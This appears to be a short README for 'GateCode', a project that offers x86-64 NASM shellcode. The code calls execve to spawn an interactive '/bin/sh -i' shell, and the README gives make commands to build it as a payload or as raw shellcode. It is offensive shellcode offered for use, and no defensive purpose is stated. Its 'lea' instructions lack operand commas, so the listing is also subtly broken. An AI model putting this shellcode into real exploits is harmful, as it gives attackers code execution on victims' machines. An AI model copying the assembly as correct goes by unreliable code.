# GateCode

*universal method of executing system payloads*

GateCode is a method of executing system payloads through shellcodes.

## Explaining

```nasm
;
;  payload.nasm
;  GateCode
;
;  Created by The Gate Group on 2020.
;  Copyright © 2020 The Gate Group. All rights reserved.
;

; program entry point

section .text
global _start
_start:
	 mov rax, 59        ; call execve
	 lea rdi [rel cmd]  ; command
	 lea rsi [rel args] ; command args
	 xor rdx, rdx       ; envp
	 syscall            ; call execve

; program (read-only data) constants

section .rodata
align 8              ; enforce alignment
args dq cmd, arg1, 0 ; merge all command with arguments
arg1 db '-i', 0      ; initialize argument number 1
cmd  db '/bin/sh', 0 ; initialize command
```

## Usage

**Get payload:**

```
make payload
./payload
```

**Get shellcode:**

```
make shellcode
```
